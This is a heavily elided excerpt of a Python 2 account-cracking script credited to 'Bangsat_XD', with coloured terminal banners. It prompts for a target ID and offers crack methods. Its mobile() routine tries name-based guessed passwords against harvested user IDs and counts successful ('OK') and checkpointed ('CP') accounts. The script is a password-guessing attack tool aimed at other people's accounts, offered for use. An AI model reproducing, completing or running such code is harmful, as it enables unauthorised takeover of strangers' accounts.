...
\033[1;93m⋆✥⋆➣\033[1;97m Twitter    : \033[1;92mBangsat_XD \033[1;97m
  \033[1;95m──────═• \033[1;92m● \033[1;95m══════════════════════════════ \033[1;92m● \033[1;97m\033[1;95m•═──────     """);time.sleep(1)
def login():
	os.system("clear")
	try:
		#-> connection test
...
def publik():
	...
	idt = raw_input("\n\033[1;96m[\033[1;93m•\033[1;96m] \033[1;92m⋆✥⋆➣\033[1;97m Target Id      : \033[1;92m")
	try:
...
def method():
	print("\033[1;96m[\033[1;93m•\033[1;96m] \033[1;92m⋆✥⋆➣\033[1;97m Choose Crack Methode [ \033[1;92mRecommended M-Basic \033[1;97m]\n")
	...
	if method == "":
		...
		ask = raw_input("[\033[1;93m•\033[1;97m] Do you choose manual passwors ? y/t : \033[1;92m")
		if ask == "y":
			manual()
		print(" ")
		...
		ask = raw_input("[\033[1;93m•\033[1;97m] Do you choose manual passwords ? y/t : \033[1;92m")
		if ask == "y":
			manual()
		print(" ")
		...
		ask = raw_input("[\033[1;92m•\033[1;97m] Do you choose manual passwords ? y/t : \033[1;92m")
		if ask == "y":
			manual()
		print(" ")
...
def mobile(user):
	...
	global loop, token
	sys.stdout.write(
		"\r[\033[1;92mR\033[0;97m] \033[1;92mCrack \033[0;93m••>\033[0;95m %s/%s ••> [OK:-%s] ® \033[0;95m[CP:-%s] "%(loop, len(id), len(ok), len(cp))
	); sys.stdout.flush()
	uid, name = user.split("<=>")
	if len(name)>=6:
		pwx = [ name, name+"123", name+"1234", name+"12345" ]
